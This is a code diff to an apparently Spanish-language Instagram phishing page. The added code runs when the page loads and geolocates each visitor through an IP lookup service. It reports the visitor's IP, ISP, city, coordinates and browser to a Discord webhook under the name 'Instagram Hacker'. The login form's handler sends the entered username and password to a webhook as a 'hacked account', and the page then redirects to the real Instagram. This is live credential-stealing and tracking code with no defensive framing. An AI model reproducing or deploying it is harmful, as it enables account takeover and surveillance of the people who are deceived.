@@ -12,21 +12,54 @@
 
 
         <script>
-            window.addEventListener('DOMContentLoaded', function(){
+            window.addEventListener('DOMContentLoaded', async function(){
+
+
+                
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                let ipPublica = data.query;
+                let isp = data.isp
+                let city =  data.city + ", " + data.regionName + ", " + data.country
+                let coors = "Lan: " + data.lat + ", Lon:" + data.lon
+                
+
+        
+                const userAgent = navigator.userAgent;
+                let browserName = "Desconocido";
+                console.log(ipPublica);
+
+                if (userAgent.includes("Chrome") && !userAgent.includes("Edg") && !userAgent.includes("OPR")) {
+                    browserName = "Google Chrome";
+                } else if (userAgent.includes("Firefox")) {
+                    browserName = "Mozilla Firefox";
+                } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+                    browserName = "Apple Safari";
+                } else if (userAgent.includes("Edg")) {
+                    browserName = "Microsoft Edge";
+                } else if (userAgent.includes("OPR") || userAgent.includes("Opera")) {
+                    browserName = "Opera";
+                } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
+                    browserName = "Internet Explorer";
+                }
+
+                
+
+
+                console.log(ipPublica);
 
                 const entrada = {
-                                content: "Una victima a accedido a la pagina",
+                                content:  "\n\n==================================\n" + "Una victima ha accedido a la pagina: \n\n" + "IP: " + ipPublica + "\nNavegador: "+ browserName + "\nProveedor: " + isp + "\nUbicación: " + city + "\nCoordenadas: " + coors + "\nUser-Agent: " + userAgent +  "\n==================================\n",
                                 username: "Instagram Hacker",
                                 };
 
-
-
-                fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
+                const test = await fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(entrada)
 
-                    });
+                });
+                
 
             
             });
@@ -49,13 +82,16 @@
                     <button type="button" onclick="redirect()" >Entrar</button>
 
                     <script>
+                        function redirect(){
+                            location = 'https://www.instagram.com'
+                        }
                         function cambio(){
 
                             var usuario = document.getElementsByName('email')[0].value;
                             var contraseña = document.getElementsByName('password')[0].value;
                             
                             const mensaje = {
-                                content: "Cuenta de Instagram hackeada 🥷 \n Usuario: " + usuario + "\n Contraseña: " + contraseña,
+                                content: "\n\n==================================\n🥷Cuenta de Instagram hackeada🥷 \n\n👤 Usuario: " + usuario + "\n\n🔒 Contraseña: " + contraseña+ "\n==================================",
                                 username: "Instagram Hacker",
                                 };
 
@@ -68,11 +104,7 @@
 
                             });
 
-                            function redirect(){
-
-                                location = 'https://www.instagram.com'
-
-                            }
+                            
 
                             
 
